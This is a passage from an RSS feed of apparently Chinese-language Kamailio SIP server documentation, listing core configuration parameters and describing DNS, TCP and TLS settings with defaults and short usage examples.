&lt;li&gt;&lt;a href=&#34;#10-bind_ipv6_link_local&#34;&gt;10. bind_ipv6_link_local&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#11-check_via-%EF%B8%8F&#34;&gt;11. check_via ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#12-children&#34;&gt;12. children&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#13-chroot&#34;&gt;13. chroot&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#14-corelog&#34;&gt;14. corelog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#15-debug-%EF%B8%8F&#34;&gt;15. debug ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#16-description&#34;&gt;16. description&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#17-disable_core_dump&#34;&gt;17. disable_core_dump&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#18-disable_tls&#34;&gt;18. disable_tls&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#19-enable_tls&#34;&gt;19. enable_tls&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#20-exit_timeout&#34;&gt;20. exit_timeout&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#21-flags&#34;&gt;21. flags&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#22-force_rport-%EF%B8%8F&#34;&gt;22. force_rport ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#23-fork&#34;&gt;23. fork&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#24-fork_delay&#34;&gt;24. fork_delay&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#25-group&#34;&gt;25. group&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#26-http_reply_parse&#34;&gt;26. http_reply_parse&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#27-ip_free_bind&#34;&gt;27. ip_free_bind&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#28-ipv6_hex_style&#34;&gt;28. ipv6_hex_style&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#29-kemionsend_route_callback&#34;&gt;29. kemi.onsend_route_callback&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#30-kemireceived_route_callback&#34;&gt;30. kemi.received_route_callback&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#31-kemireply_route_callback&#34;&gt;31. kemi.reply_route_callback&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#32-kemipre_routing_callback&#34;&gt;32. kemi.pre_routing_callback&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#33-latency_cfg_log-%EF%B8%8F&#34;&gt;33. latency_cfg_log ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#34-latency_limit_action-%EF%B8%8F&#34;&gt;34. latency_limit_action ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#35-latency_limit_db-%EF%B8%8F&#34;&gt;35. latency_limit_db ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#36-latency_log-%EF%B8%8F&#34;&gt;36. latency_log ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#37-listen-%EF%B8%8F&#34;&gt;37. listen ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#38-loadmodule&#34;&gt;38. loadmodule&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#39-loadmodulex&#34;&gt;39. loadmodulex&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#40-loadpath&#34;&gt;40. loadpath&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#41-local_rport-%EF%B8%8F&#34;&gt;41. local_rport ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#42-log_engine_data&#34;&gt;42. log_engine_data&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#43-log_engine_type&#34;&gt;43. log_engine_type&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#44-log_facility-%EF%B8%8F&#34;&gt;44. log_facility ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#45-log_name-%EF%B8%8F&#34;&gt;45. log_name ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#46-log_prefix-%EF%B8%8F&#34;&gt;46. log_prefix ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#47-log_prefix_mode-%EF%B8%8F&#34;&gt;47. log_prefix_mode ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#48-log_stderror&#34;&gt;48. log_stderror&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#49-cfgengine&#34;&gt;49. cfgengine&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#50-maxbuffer-%EF%B8%8F&#34;&gt;50. maxbuffer ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#51-max_branches&#34;&gt;51. max_branches&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#52-max_recursive_level&#34;&gt;52. max_recursive_level&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#53-max_while_loops-%EF%B8%8F&#34;&gt;53. max_while_loops ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#54-mcast&#34;&gt;54. mcast&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#55-mcast_loopback&#34;&gt;55. mcast_loopback&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#56-mcast_ttl&#34;&gt;56. mcast_ttl&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#57-memdbg&#34;&gt;57. memdbg&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#58-memlog-%EF%B8%8F&#34;&gt;58. memlog ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#59-mem_join&#34;&gt;59. mem_join&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#60-mem_safety&#34;&gt;60. mem_safety&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#61-mem_status_mode&#34;&gt;61. mem_status_mode&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#62-mem_summary&#34;&gt;62. mem_summary&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#63-mhomed&#34;&gt;63. mhomed&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#64-mlock_pages&#34;&gt;64. mlock_pages&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#65-modinit_delay&#34;&gt;65. modinit_delay&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#66-modparam&#34;&gt;66. modparam&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#67-modparamx&#34;&gt;67. modparamx&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#68-onsend_route_reply&#34;&gt;68. onsend_route_reply&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#69-open_files_limit&#34;&gt;69. open_files_limit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#70-phone2tel&#34;&gt;70. phone2tel&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#71-pmtu_discovery&#34;&gt;71. pmtu_discovery&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#72-port&#34;&gt;72. port&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#73-pv_buffer_size&#34;&gt;73. pv_buffer_size&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#74-pv_buffer_slots&#34;&gt;74. pv_buffer_slots&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#75-pv_cache_limit&#34;&gt;75. pv_cache_limit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#76-pv_cache_action&#34;&gt;76. pv_cache_action&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#77-rundir&#34;&gt;77. rundir&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#78-received_route_mode&#34;&gt;78. received_route_mode&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#79-reply_to_via&#34;&gt;79. reply_to_via&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#80-route_locks_size&#34;&gt;80. route_locks_size&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#81-server_id&#34;&gt;81. server_id&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#82-server_header-%EF%B8%8F&#34;&gt;82. server_header ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#83-server_signature-%EF%B8%8F&#34;&gt;83. server_signature ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#84-shm_force_alloc&#34;&gt;84. shm_force_alloc&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#85-shm_mem_size&#34;&gt;85. shm_mem_size&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#86-sip_parser_log&#34;&gt;86. sip_parser_log&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#87-sip_parser_mode-%EF%B8%8F&#34;&gt;87. sip_parser_mode ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#88-sip_warning-noisy-feedback&#34;&gt;88. sip_warning (noisy feedback)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#89-socket_workers&#34;&gt;89. socket_workers&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#90-sql_buffer_size-%EF%B8%8F&#34;&gt;90. sql_buffer_size ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#91-statistics-%EF%B8%8F&#34;&gt;91. statistics ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#92-stats_name_separator&#34;&gt;92. stats_name_separator&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#93-tos&#34;&gt;93. tos&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#94-udp_mtu-%EF%B8%8F&#34;&gt;94. udp_mtu ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#95-udp_mtu_try_proto&#34;&gt;95. udp_mtu_try_proto&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#96-uri_host_extra_chars&#34;&gt;96. uri_host_extra_chars&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#97-user-%EF%B8%8F&#34;&gt;97. user ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#98-user_agent_header-%EF%B8%8F&#34;&gt;98. user_agent_header ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#99-verbose_startup-%EF%B8%8F&#34;&gt;99. verbose_startup ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#100-version_table-%EF%B8%8F&#34;&gt;100. version_table ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#101-wait_worker1_mode&#34;&gt;101. wait_worker1_mode&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#102-wait_worker1_time&#34;&gt;102. wait_worker1_time&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#103-wait_worker1_usleep&#34;&gt;103. wait_worker1_usleep&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#104-workdir-%EF%B8%8F&#34;&gt;104. workdir ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#105-xavp_via_params&#34;&gt;105. xavp_via_params&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#106-xavp_via_fields&#34;&gt;106. xavp_via_fields&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;1-advertised_address&#34;&gt;1. advertised_address&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;用处不大，将会废弃&lt;/p&gt;</description>
    </item>
    <item>
      <title>1.7 DNS 参数</title>
      <link>https://wdd.js.org/kamailio/56/dns-params/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://wdd.js.org/kamailio/56/dns-params/</guid>
      <description>&lt;p&gt;Note: See also file doc/tutorials/dns.txt for details about Kamailio&amp;rsquo;s
DNS client.&lt;/p&gt;
&lt;p&gt;Kamailio has an internal DNS resolver with caching capabilities. If this
caching resolver is activated (default setting) then the system&amp;rsquo;s stub
resolver won&amp;rsquo;t be used. Thus, also local name resolution configuration
like /etc/hosts entries will not be used. If the DNS cache is
deactivated (use_dns_cache=no), then system&amp;rsquo;s resolver will be used. The
DNS failover functionality in the tm module references directly records
in the DNS cache (which saves a lot of memory) and hence DNS based
failover only works if the internal DNS cache is enabled.&lt;/p&gt;</description>
    </item>
    <item>
      <title>1.8 TCP参数</title>
      <link>https://wdd.js.org/kamailio/56/tcp-params/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://wdd.js.org/kamailio/56/tcp-params/</guid>
      <description>&lt;p&gt;The following parameters allows to tweak the TCP behaviour.&lt;/p&gt;
&lt;h1 id=&#34;1-disable_tcp&#34;&gt;1. disable_tcp&lt;/h1&gt;
&lt;p&gt;Global parameter to disable TCP support in the SIP server. Default value
is &amp;rsquo;no&#39;.&lt;/p&gt;
&lt;p&gt;Example of usage:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  disable_tcp=yes
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;2-tcp_accept_aliases&#34;&gt;2. tcp_accept_aliases&lt;/h1&gt;
&lt;p&gt;If a message received over a tcp connection has &amp;ldquo;alias&amp;rdquo; in its via a new
tcp alias port will be created for the connection the message came from
(the alias port will be set to the via one).&lt;/p&gt;</description>
    </item>
    <item>
      <title>1.9 TLS参数</title>
      <link>https://wdd.js.org/kamailio/56/tls-params/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://wdd.js.org/kamailio/56/tls-params/</guid>
      <description>&lt;p&gt;Most of TLS layer attributes can be configured via TLS module
parameters.&lt;/p&gt;
&lt;h1 id=&#34;1-tls_port_no&#34;&gt;1. tls_port_no&lt;/h1&gt;
&lt;p&gt;The port the SIP server listens to for TLS connections.&lt;/p&gt;
&lt;p&gt;Default value is 5061.&lt;/p&gt;
&lt;p&gt;Example of usage:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  tls_port_no=6061
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;2-tls_max_connections&#34;&gt;2. tls_max_connections&lt;/h1&gt;
&lt;p&gt;Maximum number of TLS connections (if the number is exceeded no new TLS
connections will be accepted). It cannot exceed tcp_max_connections.&lt;/p&gt;
&lt;p&gt;Default value is 2048.&lt;/p&gt;
&lt;p&gt;Example of usage:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  tls_max_connections=4096
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
  </channel>
</rss>
